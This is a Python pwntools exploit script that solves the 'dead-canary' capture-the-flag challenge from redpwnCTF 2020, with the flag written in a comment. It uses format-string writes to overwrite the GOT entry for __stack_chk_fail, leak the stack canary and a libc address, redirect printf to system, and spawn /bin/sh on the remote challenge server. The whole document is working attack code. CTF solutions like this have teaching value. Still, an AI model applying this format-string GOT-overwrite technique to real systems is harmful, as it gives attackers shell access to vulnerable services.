#!/usr/bin/env python3

#flag{t0_k1ll_a_canary_4e47da34}

from pwn import *

exe = ELF("./dead-canary")

libc = ELF("libc.so.6")

context.binary = exe


def conn():
    return remote("2020.redpwnc.tf" ,31744)




def send_data(r, data):
	print(r.recvuntil("is your name: "))
	r.send(data)
	return r.recvuntil("What ")

def leak_canary(r):
	offset = 264
	data = send_data(r, "M"*(offset+1))
	random_addr = data[-5-6-8:-5-6:]
	random_addr = random_addr.decode('ISO-8859-1')
	random_addr = random_addr.replace("M", "\x00")
	random_addr = u64(random_addr + "\x00"*(8 - len(random_addr)))

	return random_addr



def main():
	#r = process("./dead-canary")
	r = conn()
	r.recvuntil("What is your name: ")
	offset = 264
	main = 0x0400737
	write = { exe.got["__stack_chk_fail"] : main }
	payload = fmtstr_payload(6, write)
	payload += b"M"*(offset - len(payload) + 1)
	r.send(payload)


	canary = leak_canary(r)
	log.info("Canary is 0x%x",leak_canary(r))

	leak_libc = b"%149$p"
	leak_libc += b"M"*(offset - len(leak_libc) + 1)

	data = send_data(r, leak_libc) # leak __libc_start_main + 243
	__libc_start_main_243 = data[6:6+14:].decode("ISO-8859-1")
	__libc_start_main_243 = int(__libc_start_main_243, 16)

	log.info("__libc_start_main + 243 @ 0x%x",__libc_start_main_243)

	libc_base = __libc_start_main_243 - 243 - libc.sym["__libc_start_main"] + 12 

	log.info("Libc base address is 0x%x", libc_base)

	system = libc_base + libc.sym['system']
	
	write = { exe.got['printf']:system }
	payload = fmtstr_payload(6, write)			#Change the GOT printf -> system
	payload += b"M"*(offset - len(payload) + 1)
	
	r.sendline(payload)
	r.sendline("/bin/sh")
	r.interactive()



if __name__ == "__main__":
    main()
